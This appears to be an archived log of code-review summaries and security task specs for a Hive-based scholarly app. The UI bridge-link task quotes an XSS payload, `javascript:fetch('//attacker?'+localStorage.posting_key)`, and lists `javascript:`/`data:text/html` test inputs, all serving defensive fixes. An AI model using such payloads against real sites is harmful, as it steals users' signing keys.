## BACKEND-CITATION-CO-AUTHOR-VOTER-EXCLUSION (archived 2026-06-02) — review clean ✓ (deviation signed off)

`/ce-code-review` (correctness/security/adversarial + testing/maintainability/project-standards/performance/kieran-typescript/learnings; ce-agent-native skipped per PEvO) on commit d7ee2363. Fix adds a canonicalizing co-author `NOT EXISTS` over `cp.citing_meta -> $appTag -> 'authors'` to `citing_paper_quality.weighted_upvotes`, closing the confederate-co-author citation-inflation vector; verified byte-identical to the `paper_resolved_votes` sibling (modulo metadata/voter alias) against real Postgres. **Architect signed off the implementer's deviation:** retaining `clv.voter != cp.citing_author` is load-bearing (dropping it re-admits the author's self-upvote when they are absent from `authors[]` or authors is non-array) — the task's "drop the byte-equality" acceptance bullet is superseded; the sibling keeps the same backstop. `$appTag` is param-bound (no injection); `clv.voter` is chain-validated lowercase. New canary pins the canonicalization shape AND the retained byte-equality (one mutation-kill per defense layer) plus a real-Postgres behavioral case. P2 DRY (extract a `coAuthorExclusionNotExists` helper) dismissed — mitigated by the shape-pin canary. TAB/NBSP `TRIM`-evasion (pre-existing, sibling-shared, self-defeating) and reputation-algorithm.md doc-sync (line 71 already states the invariant globally) dismissed. Nothing held.

## BACKEND-LOADWOTTHRESHOLD-SIGNER-GATE (archived 2026-06-02) — review clean ✓

`/ce-code-review` (correctness/security/adversarial + testing/maintainability/project-standards/kieran-typescript/learnings) on commit 4c386690. Closes an unauthenticated threshold-injection: any account could broadcast `update_params{min_accreditations_for_wot:0}` and (via the `?? DEFAULT` fallback) auto-accredit every account on its first vouch. Fix gates the on-chain read on `required_posting_auths ?| $N::text[]` bound to `config.accreditationAuthorities` (matches the 8+ sibling signer-gate sites; `?|` is the correct plural-authority operator; HAF indexes only consensus-valid ops, so a stranger cannot list an authority they do not control) and replaces `??` with `Number.isInteger(n) && n >= 1`. Verified closed on both axes against the trust model (correctness/security/adversarial). Dismissed: testing FALSE POSITIVE (the cited sibling test exists in `tests/routes/`); no-upper-bound threshold DoS (authority-gated, in trust model, pre-existing); param-order, the carried-forward BitmapAnd-ref comment, the missing `id DESC` tiebreaker, and the `Number.isInteger` any-narrowing (cosmetic/pre-existing, no functional impact at single-instance scale). Nothing held.

## BACKEND-SEARCH-TYPE-ALL-TOTAL-TEST (archived 2026-06-02) — review clean ✓

`/ce-code-review` (correctness/testing/project-standards) on commit bae2827a (test-only). Adds `mockBothBranchesSucceed(3,5)` and asserts `type=all` `meta.total === 8`, distinguishing the real `(paperResult?.total ?? 0) + (reviewResult?.total ?? 0)` summation from a `Math.max` swap (5) or a single-branch return (3/5); verified mechanically reaching the summation in `search.ts`. The new mock reuses the file's existing carve-out shape (clause-a covered, `getPool` mock allowed, clause-c companion present); the `count(*) OVER ()` window-total is correctly modeled as decoupled from returned row count, and `data.length === 2` is correct for the merged branches. Anchors clean. Nothing held.

## UI-NOTIFICATION-CLAIM-EVENT-RENDERING (archived 2026-06-01) — review clean ✓

`/ce-code-review` (correctness/testing/maintainability/project-standards/learnings; ce-agent-native-reviewer skipped per PEvO) on commit 7304ad17. **Deliverable 1 (UI):** three `formatNotification` typeMap entries (claim_pending/approved/revoked → `notifications.claim*`) + three `en.json` keys + 15 English-stub locales tracked in STUBS.md. Correctness read `notification-queries.ts` and confirmed copy matches recipient/voice per arm (claim_pending → post author, actor-driven; approved/revoked → claimer, impersonal, no dangling placeholder); the three tests fail against the pre-fix `return event.type` (raw token carries `claim_`, tripping `not.toContain('claim_')`); suite green (15). `formatNotification` has a single render surface (notifications dropdown), copy carries no emdashes, STUBS.md heading format is conventional. **Deliverable 2 (architect):** added the three `claim_*` entries (JSON example, event-type table rows, recipient/actor note) to `api-contracts/notifications.md`, verified against arms 7/8/9 (claim_pending notifies post author + carries actor; approved/revoked notify claimer + no actor; none carry paper_title; all signer-gated). Five P3 advisory findings (unused-param noise, inert fixture fields, $t-mock param serialization, missing keep-same/exhaustiveness tests) all dismissed per the dismiss-preemptive-hardening posture. Nothing held.

## UI-NOTIFICATION-TARGET-TYPE-RENDER (archived 2026-06-01) — re-review clean ✓

`/ce-code-review` (correctness/testing/maintainability/project-standards/learnings; ce-agent-native-reviewer skipped per PEvO) on the held-item fix commit 387d3b12. Round-1 held item 1 (untested `citing_permlink` + `paper_permlink` dedup-fallback legs) is FIXED: two keep-distinct tests added to `notifications.test.js` mirroring the existing vote-leg test, feeding the real snake_case wire shape (target under `citing_permlink`/`paper_permlink`, no top-level `permlink`). Correctness traced that the pre-fix single-leg `e.permlink` key collapses each pair to one (`toBe(2)` fails) while the 4-leg key keeps them distinct, so each is a genuine regression guard; suite green (24). The original change (f5295b75: snake_case vote-noun + paper-title reads, per-type dedup key) was reviewed and confirmed functionally correct in round 1. Advisory items (inert fixture fields, optional keep-same companions) dismissed.

## BACKEND-REVIEWS-SQL-ACCREDITATION-GATE-404-REGRESSION (archived 2026-05-31) — re-review clean ✓

`/ce-code-review` (correctness/testing/maintainability/project-standards/kieran-typescript on Sonnet; ce-agent-native-reviewer skipped per PEvO) on the held-item fix commit. The reviews-route SQL-accreditation-gate mock now derives `accredBindCount = activeAccreditationsCte().params.length` from the same helper `fetchReviewFromHaf` prefixes its param array with, replacing the magic literal `2` whose comment falsely claimed a derivation. Verified: the mock's `author`/`hiveAnonAccount` slot reads shift in lockstep with the route if the CTE bind count drifts, so the param-slot 404 regression class is now structurally unreachable; the three structural SQL-presence canaries (`active_accreditations` gate, `OR c.author =`, `~ '^[1-5]$'`) are untouched; the two 200-cases pass and the sibling 404 stays green. Reworded comment anchors on the helper symbol, no slug/line/SHA. No findings (one pre-existing `params[...] as string` cast noted, out of scope). Round-1 held item 1 (comment overclaimed a decoupling the literal didn't implement) is FIXED.

## BACKEND-SSR-JSONLD-SCRIPT-BREAKOUT (archived 2026-05-30) — review clean ✓

`/ce-code-review` (correctness/security/adversarial on Opus; testing/maintainability/project-standards/kieran-typescript/learnings on Sonnet; ce-agent-native-reviewer skipped per PEvO) on commit bff2e375. `jsonLdSafe` escapes `<`/`>`/`&`/U+2028/U+2029 to their `\uXXXX` JSON forms across all three JSON-LD emits (ScholarlyArticle, BreadcrumbList, Person); the `</script>` breakout is closed on the exploitable path (verified for replacement-order safety, JSON validity, case-insensitivity, `<!--`/CDATA, and Unicode). The surviving `JSON.stringify(pevoConfig)` bootstrap script is out-of-scope-correct: operator-env-only, appTag regex-validated, and CSP-hash-pinned. No P0/P1. Findings were P3 test-coverage (the BreadcrumbList block is protected by the code but not pinned by an assertion; U+2028 untested) and P3 polish (helper naming, `unknown` param) — dismissed as preemptive hardening / opinion.

## BACKEND-REPLAY-AND-TIMESTAMP-WINDOW-HARDENING (archived 2026-05-30) — review clean ✓

`/ce-code-review` (correctness/security/adversarial on Opus; reliability/testing/project-standards/learnings on Sonnet) on commits 0d264ff3 + acd0f8bf. The replay guard now records a verified signature in the in-memory store unconditionally, and `isReplaySignature` reads `seenInMemory` upfront and OR-s it with the Redis result, closing BOTH the ready-but-throwing-SETNX flap and the throw-then-recover ordering. The timestamp check switched to a past-biased [now-60s, now+5s] window (mirrors the custody upgrade-proof form), killing the ~120s future-dating window. Real cryptographic verification runs in the tests (carve-out clause (b) satisfied). No P0/P1. Three pre-existing edge cases (concurrent-replay TOCTOU, same-second-revocation off-by-one, iat-absent invalidation skip) were routed to follow-up `backend-verifyhivesignature-preexisting-replay-revocation-hardening` rather than held against this clean fix. (Note: the sibling `backend-session-invalidation-fail-closed` task — same commit — was held for a 503 retriable-flag fix + two pre-existing emdashes, so it is not archived here.)

## Cumulative-Union Doc Edits (archived 2026-05-30) — review-clean after fixes ✓

Architect landed the deferred §2 doc edits for the cumulative-union + author-identity model: ARCHITECTURE.md §2 "Display construction (cumulative union)", papers.md PaperSummary/PaperDetail author notes, hive-schemas.md §1.1 name-supersession, and the pevo-object-identity + pevo-paper-version-chain solutions docs, grounded against the implemented code (buildCumulativeAuthorsForChain, resolveChainCumulativeAuthors, author-supersession.ts).

Re-review `/ce-code-review` (correctness on Opus; testing/maintainability/project-standards/learnings on Sonnet; ce-agent-native-reviewer skipped per PEvO) surfaced 4 findings, all resolved before archive: (#1, P1) §2 described the continuation-author-consent gate as admitting "vouched" authors, but the live gate admits on CLAIMED cumulative pevo.authors[].hive membership (extractAuthorizedContinuationAuthors + resolveContinuationChain); the vouched layer (computeVouchedAuthors / fetchConsentOpsForPaper in consent-ops.ts) has read-time computation primitives implemented but is not wired into any gate. Added an "Implementation status" note marking the live-vs-Phase-2 boundary and corrected the threat-model / vouched-vs-claimed / migration / field-mutation / authors-mutation text. (#2, P2) swept partial-sweep residue from the version-chain doc's Why/When/Related sections (stale "currently spoofable / gate pending" language + two archived task-slug citations). (#3, P2) papers.md continuation-admission rule now reads cumulative chain authors[], matching code and the PaperSummary note. (#4, P3) replaced two dead "ARCHITECTURE.md § 2.20" refs in papers.md with the real named subsections. (#5 dismissed) ARCHITECTURE.md task-slug citation is within existing practice and outside the comment-anchor convention's literal scope. A 3-lens adversarial re-review (doc-vs-code on Opus, cross-doc consistency, conventions/emdash) confirmed all clean.

## BACKEND-GETGENESISBLOCK-FALLBACK-NO-CACHE (archived 2026-05-30) — round-1 clean ✓

`getGenesisBlock`'s no-accreditation fallback cached HEAD permanently, pinning the genesis floor at boot-time HEAD so that once the first accreditation landed, every `cj.block_num >= genesis` predicate returned zero rows until restart. Fix: return the HEAD floor for the current call only WITHOUT assigning `genesisBlock`, so the primary `MIN(accredit block)` query re-runs each call until a real genesis is found, then caches it (one cheap bounded indexed query per call during the transient, self-terminating pre-genesis window; PEvO is single-instance). New fake-pool regression test (`vi.resetModules` for a clean module cache) covers fresh-DB fallback → first-accreditation caching → short-circuit, with a documented mock carve-out (clause a/c). Round-1 `/ce-code-review` (correctness on Opus; testing/maintainability/project-standards/performance/reliability on Sonnet; `ce-agent-native-reviewer` skipped per PEvO): clean. Confirmed the `block && block > 0` guard distinguishes a real genesis from NULL, the return-HEAD-uncached path is fail-safe (empty namespace makes any floor equivalent — returning the high HEAD floor excludes more, no forgery surface), and the already-cached short-circuit protects against transient primary-query failures.

## BACKEND-NOTIFICATIONS-NEW-REPLY-PAPER-COORDS-NULLABLE (archived 2026-05-30) — round-1 clean ✓ (code) + contract synced

`NewReplyEvent` declared `paper_author`/`paper_permlink` required, but arm 5 always projected NULL for them (a reply can sit N levels deep; root paper coords need unbounded recursive SQL), so any consumer building `/papers/${paper_author}/${paper_permlink}` landed on `/papers/null/null`. Backend dropped the fields from the type + handler (arm-5 SELECT keeps positional NULL columns for UNION ALL arity, with a clarifying comment) and added a source-shape guard. Architect landed the contract half: dropped the coords from the `new_reply` example in `api-contracts/notifications.md` and added an explanatory note that reply events carry no resolvable paper coords. Round-1 `/ce-code-review` (correctness on Opus; api-contract/testing/maintainability on Sonnet): code clean. Verified no backend (`digest.ts`) or frontend (`header.js` renders via i18n key, reads only `actor`) consumer reads the dropped fields; UNION arity unchanged; removal is cleaner than keep-as-optional for the single same-origin SPA consumer (avoids re-advertising a never-populated coordinate).

## BACKEND-NOTIFICATIONS-VOTE-ARM-CONTENT-FILTER (archived 2026-05-30) — round-1 clean ✓ (code) + contract synced

Notification vote arm 2 only required `v.author = $1` + accredited voter, so a vote on the recipient's non-PEvO Hive content surfaced as "X endorsed your paper" and votes on reviews wrongly emitted `target_type='paper'`. Split into 2a (native paper votes: `JOIN comments` + `validPevoPaperWhere`, `target_type='paper'`), 2b (bridge paper votes via `user_bridge_papers`, `'paper'`), 2c (review votes: `JOIN comments` + `validReviewWhere`, `target_type='review'`), each adding `v.voter != v.author` to drop self-votes. Added synthetic-VALUES canaries (2a content-filter+self-vote, 2c review `target_type`) + a source-shape guard. Architect landed the contract half: documented `new_vote.target_type` as `"paper" | "review"` plus the self-vote exclusion in `api-contracts/notifications.md`. Round-1 `/ce-code-review` (security+correctness on Opus; testing/maintainability/performance/project-standards on Sonnet): code clean. Verified content gates complete (the gated metadata belongs to the recipient `$1`, so no cross-account forgery), gates mutually exclusive on the single-valued `pevo.type` (no double-fire), 2b recipient-scoped via the `registered_by` CTE, UNION arity correct, JOINs bounded by the comments PK. F6 (no union-level mutual-exclusion canary) dismissed — safe by construction.

## UI Bridge Source-Href Protocol Validation (archived 2026-05-30)

# UI-BRIDGE-SOURCE-HREF-PROTOCOL-VALIDATION — block `javascript:` / `data:` protocols in bridge external paper-source links

**Owner:** UI Agent
**Created:** 2026-05-30 (security audit follow-up workflow)
**Priority:** P2 (one-click XSS via attacker-crafted bridge entry; severity depends on who can author bridge json_metadata fields)

## Problem

The bridge feature renders external paper-source URLs from chain `json_metadata` via Alpine `:href` bindings without a protocol whitelist:

- `frontend/src/pages/paper-detail.js` — the bridge-paper source-URL `<a :href="...">` render (post-import or post-bridge view).
- `frontend/src/pages/bridge.js` — the bridge lookup preview, rendering source and PDF URLs.

Alpine's attribute binding safely escapes quote-breakout but does NOT block `javascript:`, `data:text/html`, or similar protocol-injection URLs. The markdown sanitizer's URL-protocol transformer (the chokepoint in `frontend/src/components/markdown-renderer.js`) is bypassed entirely here — these bindings read raw values from chain `json_metadata` and feed them to `:href` directly.

Clicking an attacker-crafted bridge entry whose source URL is `javascript:fetch('//attacker?'+localStorage.posting_key)` executes script same-origin under `pevo.app`.

Severity depends on who can author bridge `json_metadata` fields. If bridge entries can be authored by any Hive account (no accreditation gate), this is a higher-impact reflected XSS. If only accredited authors can populate the bridge fields, the surface is narrower but still a real one-click XSS sink. The fix is the same either way; this task does not depend on resolving that question.

## Goal

Wrap every bridge external URL render with a small `safeExternalUrl(url)` helper that returns the URL only if `new URL(url).protocol` is in `{'http:', 'https:'}`, else returns a safe fallback (`'#'` or `''`).

## Fix sketch

```js
// frontend/src/utils/safe-url.js (or co-located in a frontend utils module)
export function safeExternalUrl(url) {
  if (typeof url !== 'string' || !url) return '';
  try {
    const parsed = new URL(url, window.location.origin);
    if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
      return parsed.href;
    }
  } catch {
    // fall through
  }
  return '';
}
```

Then in the two consuming files:

```js
// before
<a :href="sf.source_url" target="_blank">...</a>
// after
<a :href="safeExternalUrl(sf.source_url)" target="_blank" rel="noopener noreferrer">...</a>
```

Apply to every `:href` binding in the bridge surface that reads from `json_metadata` or chain-derived data. While touching these sites, also confirm `rel="noopener noreferrer"` is present (existing convention; flag in-place if missing).

Co-location decision (utils module vs inline): implementer's call; a shared util is preferred since this is reusable for any future external-URL render.

## Acceptance

1. **`javascript:` rejected.** Test: a bridge entry whose source URL is `javascript:alert(1)` renders with `href=""` (or whatever the safe fallback is). Click does NOT execute script.
2. **`data:text/html` rejected.** Same as (1) for `data:text/html,<script>alert(1)</script>`.
3. **`http:` and `https:` permitted.** Test: legitimate `https://arxiv.org/abs/...` URLs render unchanged and navigate normally.
4. **Both consumer files updated.** Grep confirms every `:href` binding in `frontend/src/pages/paper-detail.js` and `frontend/src/pages/bridge.js` that reads bridge / chain-derived data flows through `safeExternalUrl`.
5. **`rel="noopener noreferrer"` present** on every `target="_blank"` external link in the bridge surface (in-place fix if missing).
6. **Mutation-kill:** revert the protocol check → at least one of the rejection tests goes RED.

## Out of scope

- A site-wide audit of every `:href` / `:src` binding outside the bridge surface (the focused audit confirmed the rest of the surface is clean today; revisit if a new external-URL render lands).
- Backend-side validation of bridge `json_metadata` shape (the chain is the source of truth; the frontend defends at render).
- The question of who can author bridge entries (separate concern; the fix is needed regardless).

## References

- `frontend/src/pages/paper-detail.js` — bridge source-URL render.
- `frontend/src/pages/bridge.js` — bridge lookup preview render.
- `frontend/src/components/markdown-renderer.js` — the chokepoint that DOES block `javascript:` (reference for the protocol check pattern, plus the URL transformer used by DOMPurify).
- MDN: `URL` constructor and `protocol` property semantics.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>


## UI Esc Helpers Quote Escape (archived 2026-05-30)

# UI-ESC-HELPERS-QUOTE-ESCAPE — add `"`/`'` escape to `_esc`/`escapeHtml` helpers (latent landmine)

**Owner:** UI Agent
**Created:** 2026-05-30 (security audit follow-up workflow)
**Priority:** P3 (latent — safe today via Hive author/permlink format; future-caller landmine)

## Problem

The `_esc` / `escapeHtml` helper(s) in `frontend/src/editor.js` (and any sibling co-located helpers) escape `<`, `>`, and `&` but omit `"` and `'`. This is safe today because every current caller passes either a Hive author name (`[a-z0-9.-]{3,16}`, chain-constrained) or a permlink (`[a-z0-9-]+`, no quote chars), both of which cannot contain quote characters. But:

- A future caller that passes a free-form string (a paper title, display name, search query) into the same helper and then interpolates into HTML **attribute context** (`<a href="..." title="${escapeHtml(freeFormTitle)}">`) gets attribute-quote breakout via `"`.
- The helper's name (`escapeHtml`) reads as a general-purpose HTML escape; an unsuspecting future caller has no signal that the helper is unsafe in attribute context.

This is a latent landmine, not an exploitable bug today. The fix is a 2-line addition to the helper with zero caller changes required and zero behavior change for current callers. Worth landing in the same pass as the rest of the security cleanup so the landmine doesn't survive.

## Goal

Extend the helper(s) to also escape `"` and `'`, making them safe for both element-content and attribute contexts. No caller changes; behavior identical for any string lacking quote characters.

## Fix sketch

```js
function escapeHtml(s) {
  return String(s ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```

Apply to every `_esc` / `escapeHtml` declaration in the frontend (grep to find them; co-located copies in different files should each be updated, or factored to a single shared util module — implementer's call on consolidation).

## Acceptance

1. **Quote chars escaped.** Test: `escapeHtml('foo"bar\'baz')` returns `foo&quot;bar&#39;baz`.
2. **Existing escapes unchanged.** Test: `escapeHtml('<a>&b</a>')` returns `&lt;a&gt;&amp;b&lt;/a&gt;` (no double-escape regression on `&amp;`).
3. **Null/undefined safe.** Test: `escapeHtml(null)` returns `''`; `escapeHtml(undefined)` returns `''`.
4. **Every copy updated.** Grep confirms no `_esc` / `escapeHtml` function in the frontend retains the old 3-char-only form.
5. **No behavioral regression for current callers.** Existing tests for editor-render, profile-render, etc. continue to pass (the current inputs lack quote chars, so the output is byte-identical).
6. **Mutation-kill:** revert the `"` replacement → test (1) goes RED.

## Out of scope

- Refactoring or renaming callers; the helper change is transparent.
- A frontend-wide audit of attribute-context interpolation (the focused audit confirmed the rest of the surface is clean today via Alpine's `:attr` binding which handles attribute-quote escaping internally).
- Consolidating multiple `_esc` copies into a single shared util (nice-to-have; not required).

## References

- `frontend/src/editor.js` — current `_esc` / `escapeHtml` helper.
- OWASP XSS Prevention Cheat Sheet, "HTML attribute context" rule.
- The focused security audit (May 2026) flagged this as latent-only; current callers are all chain-constrained handles.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>


## BACKEND-SEARCH-COUNT-DATA-WINDOW-FUNCTION (archived 2026-05-30) — round-1 clean ✓

Consolidated the parallel count+data query pair into a single data query carrying `count(*) OVER ()::int AS total` across all three listing sites (`fetchPapersFromHaf` in `routes/papers.ts`, `searchPapersFromHaf` + `searchReviewsFromHaf` in `routes/search.ts`), eliminating the duplicate `active_accreditations + retracted_papers` CTE materialization and redundant WHERE evaluation per cache miss. Each site keeps the `dataResult.rows[0]?.total ?? 0` zero-row degrade (precedent: `fetchAccreditationsFromHaf`). New `listing-count-window-function-shape.test.ts` pins the window-function shape + single-query + no-`total`-leak + empty-degrade per site, with a documented mock carve-out (clause a/b/c). Round-1 `/ce-code-review` (correctness on Opus; performance, testing, project-standards on Sonnet; `ce-agent-native-reviewer` skipped per PEvO): clean. Correctness verified count parity at all three sites — the only real JOIN (`searchReviewsFromHaf`, `c JOIN comments p` on the `(author,permlink)` natural PK) cannot fan out, the other two have no top-level JOIN (aggregates are scalar correlated subqueries), and no DISTINCT/GROUP/HAVING mismatch anywhere. Soft notes NOT held: perf conf-50 (`count(*) OVER ()` forecloses index early-termination on the default date sort — a net win at PEvO single-instance scale; verify with EXPLAIN if listing latency regresses); `type=all` summed-total (`paperTotal + reviewTotal`) untested (P3) — spun off as follow-up task `backend-search-type-all-total-test`.

---

## BACKEND-ESLINT-RULE-BITMAPAND-FLOOR-GUARD (archived 2026-05-30) — round-4 clean ✓

ESLint rule `pevo/no-custom-id-block-num-floor` (in `backend/eslint.config.mjs`) guarding the BitmapAnd-toxic SQL shape (`custom_id = $appTag AND block_num >= $genesis` against `hafsql.operation_custom_json_view`, which blows the per-request walker budget → 503). Modelled on `noBridgePaperLiteralRule`; regex-over-string-literal, not a SQL parser. Rounds 1-4: built the rule + RuleTester suite; suppressed 16 pre-existing toxic sites with `eslint-disable` directives anchored on route/helper symbols; broadened `CUSTOM_ID_RE` from `\b\w+\.custom_id\b` to `\b(?:\w+\.)?custom_id\b` to match aliased AND bare `custom_id` (caught `wot.ts` `loadWotThreshold` as the unflagged 16th site); added a mid-token-split (`cj.custom_${suffix}`) valid case that mutation-kills the NUL-quasi-join drop; extracted shared `foldStringExpr`/`foldArrayJoin` walker delegated by both the floor rule and `no-bridge-paper-literal`, and added a `CallExpression` visitor closing the `.join(' AND ')`-assembled-literal evasion; refreshed stale `\b\w+\.custom_id\b` citations in the test docblock to the shipped form; round-4 reflowed a widowed docblock line (cosmetic). Round-4 `/ce-code-review` (maintainability + project-standards on Sonnet; `ce-agent-native-reviewer` skipped per PEvO): 0 findings — words byte-identical after whitespace normalization, anchors clean. OUTSTANDING [TODO Architect]: the 16 suppressed toxic-shape sites still await per-site audit/fix follow-up tasks (drop the inert `block_num >=` floor + remove the disable, each needing a real-HAF row-count/ordering re-verify) — not yet filed. Cross-refs: `convention-sweep-syntactic-form-misses-semantic-siblings-2026-05-21.md`, `convention-enforcing-fix-must-audit-its-own-new-code-2026-05-17.md`.

---

## BACKEND-CACHE-SINGLE-FLIGHT-COALESCING-SWR-COLD-PATH (archived 2026-05-30) — round-3 clean ✓

Extended single-flight coalescing (Gap A) + per-tier epoch-guard invalidation-during-flight protection (Gap B) from `QueryCache.getOrSet` to the three unguarded sibling paths in `backend/src/cache.ts`: `getOrSetSWR` cold-path, the `revalidate` background helper, and the `registerPeriodicRefresh.reload` closure. All four success-path `this.set` sites now capture `volatileEpoch`/`stableEpoch` synchronously before the sole `await fn()` and gate non-stable writes on both counters, stable writes on `stableEpoch` only. The cold-path shares `this.inflight` with `getOrSet` but namespaces its key as `${this.prefix}swr-cold:${key}` so an SWR caller can never coalesce onto a `getOrSet` promise that skips the stale-key write. Depended on the parent task's per-tier counter split (archived 2026-05-26). Rounds 1-3: round-2 added `clearVolatile()` tier-distinguishing companion specs that mutation-kill the wrong-counter (volatile-vs-stable) bug the `clear()`-only specs left alive, corrected the `revalidate` stale-key assertion to `toEqual({value:'v1'})` (since `invalidate(key)` does not delete the `swr:` key), namespaced the cold-path inflight key, and fixed docblock drift; round-3 (comment-only) replaced a stale `${config.appTag}:cache:<routeKey>` field-comment example with a docblock-deferring description and reworded the cold-path "impossible by construction" overclaim to an honest reserved-prefix-by-convention invariant. Round-3 `/ce-code-review` (correctness on Opus; maintainability + project-standards on Sonnet; `ce-agent-native-reviewer` skipped per PEvO): 0 findings — correctness verified all three rewritten comment claims (getOrSet vs cold-path namespacing, the reserved-prefix collision case, per-caller cast) are factually accurate against the code. Residual (documented, not held): the `swr-cold:` reserved-prefix invariant and the check-then-set TOCTOU window are convention/single-instance-bounded, not runtime-enforced. Cross-refs: `single-flight-coalescing-amplifies-cache-invalidation-race-2026-05-20.md`, `caching-wrapper-discriminated-union-poisoning-2026-05-11.md`.

---

## BACKEND-IPFS-APPTAG-FLIP-PENDING-UPLOAD-DRAIN (archived 2026-05-30) — WON'T-DO, premise rejected ✗

P3 task to guard the IPFS cleanup unpin decision (`cidReferencedInHaf`) against unpinning live `pevotest`-era files across an `APP_TAG` flip. Dismissed because its founding premise — "must not unpin live old-tag files post-flip" — no longer holds. Settled product decision: after an `APP_TAG` flip, production needn't serve or retain old-tag content (an old-tag corpus, if kept, lives on a separate instance pinned to the old tag). The `APP_TAGS_HISTORICAL` code-hardening path this task spawned was reverted (`backend-revert-apptag-historical-widening`, archived 2026-05-28, restoring `cidReferencedByAppTag` to its single-tag form); the `[TODO Architect]` `.env.example` + `ARCHITECTURE.md` flip-day drain runbook were deliberately never written so as not to bake in a rejected stance. The de-duplication extraction that incidentally rode along is preserved separately (`backend-ipfs-cid-containment-query-extraction`, archived 2026-05-30). No code remains attributable to this task. If a future decision reintroduces a need to serve/retain old-tag content during a transition window, re-scope fresh rather than restoring the reverted widening. Full task body and the architect PARKED-review note in git history.

---

## BACKEND-COMMENTS-HIDE-REPLIES-TO-UNACCREDITED-PARENTS (archived 2026-05-30) — round-4 re-review clean ✓

P2 surface-correctness fix in `GET /api/papers/:author/:permlink/comments`: the recursive CTE descended through non-accredited parents, surfacing accredited-authored replies whose parent had no visible context (reproducer: `re-joann2-tdeuxx` orphan under `pevo.science/pevo-original-whitepaper-...`). Round-1 added an EXISTS gate to the recursive arm (descend only when `ct.author` is in `active_accreditations`), mirrored the gate in the count query so `meta.total` matches `data.length`, added a base-arm safety comment, and a regression test. Round-1 hold (P1 positive-presence floor + P3 base-arm comment precision); round-2 commits (`4b4f669f` + `5994c01a`) landed item 2 reword + the worker's `status === 200` addition, and the floor item resolved with a documented deviation — no accredited non-orphan sibling exists on the reproducer paper (HAF query confirmed: 5 direct replies all unaccredited, the sole accredited comment IS the orphan being hidden), so `status === 200` + `.not.toContain(ORPHAN_REPLY_PERMLINK)` proves non-vacuous because reverting the descent-gate makes the orphan reappear (its own author IS accredited), flipping the response to non-empty. Round-3 hold (P3 stale `WITH RECURSIVE` docblock parenthetical reading "the failure is silent here — the caller catches the parse error and returns []" — the catch actually loud-fails via `throw new HafQueryError(...)`, never silent `200 []`). Round-4 (commit `861df2fe`, comment-only) reworded the parenthetical to reflect loud-fail semantics, anchored on the `HafQueryError` symbol + "the catch below" (no slug/SHA/line/round-N anchor; the accurate in-catch `200 []` counterfactual left untouched per the hold's NOTE). Round-4 `/ce-code-review` (5 personas — correctness on Opus; testing/maintainability/project-standards/learnings on Sonnet; `ce-agent-native-reviewer` skipped per PEvO): CLEAN. The reworded text matches the actual `throw new HafQueryError(...)` catch and the route's 503/500 mapping; `haf-outage-translation-canaries.test.ts` pins the loud-fail propagation behaviorally; the positional-anchor stable-named-container carve-out applies to "the catch below" (same function, named companion `HafQueryError`). Cross-refs: `positional-anchor-stable-named-container-carve-out-2026-05-20.md`, `convention-enforcing-fix-must-audit-its-own-new-code-2026-05-17.md`.

---

## BACKEND-IPFS-CID-CONTAINMENT-QUERY-EXTRACTION (archived 2026-05-30) — round-3 re-review clean ✓

P2 maintainability + drift-class closure: the tags-scoped CID-reference containment query was duplicated byte-for-byte across `cidIsKnown` (`routes/ipfs.ts`, the `GET /ipfs/:cid` gateway CID-known check) and `cidReferencedInHaf` (`ipfs-cleanup.ts`, the orphan-cleanup reference check). Drift cost is asymmetric and severe: a wrong predicate in cleanup irreversibly unpins live on-chain-referenced content via Kubo `pin/rm` (not refcounted). Extraction landed `cidReferencedByAppTag` in `lib/ipfs-shared.ts` (single helper, single docblock); both consumers delegate; folded-in cleanups (`toPinBackend` type-predicate replacing the inner `as PinBackend` cast, `unrecognizedPinBackendMessage` de-duplicated). Round-1 hold (3 items: stale `imageSrfGuardExpr` docblock still naming `cidIsKnown`/`cidReferencedInHaf`; drop the export on `unrecognizedPinBackendMessage`; throw on null `rowCount` in `cidReferencedByAppTag` for the irreversible-path guard). Round-2 (commit `c6d56685`) landed all three: docblock repointed at `cidReferencedByAppTag`, module-local message, helper now throws on null `rowCount` (cleanup's per-row try/catch logs+skips and keeps the row pinned + tracking row; gateway yields a transient 502, never wrong content) — new tests: helper-level rejects-throw, cleanup-side no-unpin/no-DELETE on null reference-check. Round-2 hold (1 item: same `imageSrfGuardExpr` docblock's alias-rationale parenthetical at the upper region still named the de-duplicated `cidIsKnown` / `cidReferencedInHaf` call sites despite the same docblock's lower "sole production interpolation site" claim — internal contradiction). Round-3 (commit `ac0b66d4`, single-line edit) repointed the parenthetical at `cidReferencedByAppTag` ("aliases `comments` as `c` in its containment scan") — symbol-anchored, no new rot. Round-3 `/ce-code-review` (5 personas): CLEAN. The new parenthetical matches the code at `cidReferencedByAppTag` (which aliases `comments` as `c`), no contradiction with the lower interpolation-site claim, the separate `cidReferencedByAppTag` invariants docblock untouched per hold's NOTE, and `ipfs-shared-cid-containment.test.ts:87` already pins the `c.json_metadata` alias claim. Cross-refs: `docblock-anchor-stable-symbols-not-line-numbers-2026-05-15.md`, `convention-enforcing-fix-must-audit-its-own-new-code-2026-05-17.md`.

---

## BACKEND-APPROVE-AUTHORSHIP-SIGNER-GATE (archived 2026-05-30) — round-3 re-review clean ✓

P1 reputation-integrity (live forgery path): the `approve_authorship` arm of `accepted_claims` (`reputation.ts`'s cycle) and `authorshipClaimsCteBody`'s `approvals` source (`hafsql.ts`'s read surface) matched the approve op only on broadcaster-controlled JSON fields with no signer check — per `hive-schemas.md` `approve_authorship` must be signed by post author or bridge account. An accredited attacker could self-broadcast `claim_authorship` naming a victim's paper + self-broadcast `approve_authorship` and the claim resolved to `accepted` → forged co-author reputation credit per cycle + accepted-co-author display. Round-1 (commit `595a8c6e`) gated both surfaces on `ap.approver IN (ap.paper_author, $bridge)` projected from `required_posting_auths ->> 0`; the revoke-override MAX subquery carries the same gate (a self-signed approve cannot out-rank a legitimate revoke); folded the `§ 2.10`/`§ 2.11` reanchor into `backend-anchor-rot-sweep`'s scope (Cluster C). Round-1 hold (P1 cycle-surface SQL-shape canary gap — a param insertion before `$18` or a predicate removal in `reputation.ts` alone would silently re-open the forgery while the read-surface test stayed green). Round-2 (commit `d90ae3b9`) added `reputation-approve-signer-gate-cycle-sql-shape.test.ts` driving `computeReputationBatch` to the real inline `accepted_claims` SQL emission (captured at the pool 